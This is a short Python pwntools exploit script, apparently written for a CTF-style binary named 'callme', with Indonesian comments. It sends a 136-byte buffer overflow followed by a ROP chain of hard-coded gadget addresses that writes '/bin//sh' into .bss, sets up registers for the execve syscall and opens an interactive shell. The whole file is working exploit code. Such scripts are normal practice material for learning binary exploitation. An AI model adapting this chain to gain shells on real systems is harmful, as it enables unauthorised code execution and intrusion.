from pwn import *

binary = './callme'
elf = context.binary = ELF(binary)

p = process(binary)

#Prereq:
#execve('/bin/sh',0,0)
#RAX(RDI,RSI,RDX)
#panggil: 


#RAX -> 0x3b
#RDI -> bss/data + 8
#RSI -> /bin/sh\x00 atau /bin//sh 
#RDX
#SYSCALL
#MOV QWORD PTR(RDI


#RDI, RSI, MOV QWORD, POP RAX, 0x0,0x0, SYSCALL)
payload = b"A" * 136


pop_rax = p64(0x0000000000459997)
pop_rdi = p64(0x00000000004018e2)
pop_rsi = p64(0x000000000040f28e)
pop_rdx = p64(0x00000000004017ef)
syscall = p64(0x00000000004012e3)
mov_qword = p64(0x000000000045571f) #mov qword[rdi],rsi;ret


payload += pop_rax
payload += p64(0x3b)

payload += pop_rdi
payload += p64(elf.bss() + 8)

payload += pop_rsi
payload += b"/bin//sh"


payload += mov_qword

payload += pop_rsi
payload += p64(0x0)

payload += pop_rdx
payload += p64(0x0)

payload += syscall

p.recv()
p.sendline(payload)
p.interactive()



